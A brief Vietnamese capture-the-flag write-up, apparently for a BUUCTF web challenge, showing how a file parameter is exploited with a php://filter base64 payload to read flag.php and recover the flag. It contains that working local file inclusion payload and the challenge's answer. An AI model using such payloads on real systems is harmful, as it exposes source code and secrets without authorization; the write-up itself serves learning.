Mở lên chỉ có chữ tips 

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/add9ef48-742e-4a3e-ae69-b34373915511)

Truy cập vào được như sau 

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/3c1ffad9-14e9-421f-b1f0-a9195878c7db)

Bài này không cho hint hay source code. Mình để ý khi truy cập vào tips thì url có thay đổi và có thể exploit được

Ta nghĩ ngay đến File inclusion/Path traversal. Mình sẽ thử payload như sau:

`?file=php://filter/convert.base64-encode/resource=flag.php`

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/792a9aaf-61e5-4eb4-bf29-0e41ccc06ef4)

Sau đó ta đi decode được

```php
<?php
echo "Can you find out the flag?";
//flag{d37fe682-54b3-48c0-857a-34f76c88eefc}
```
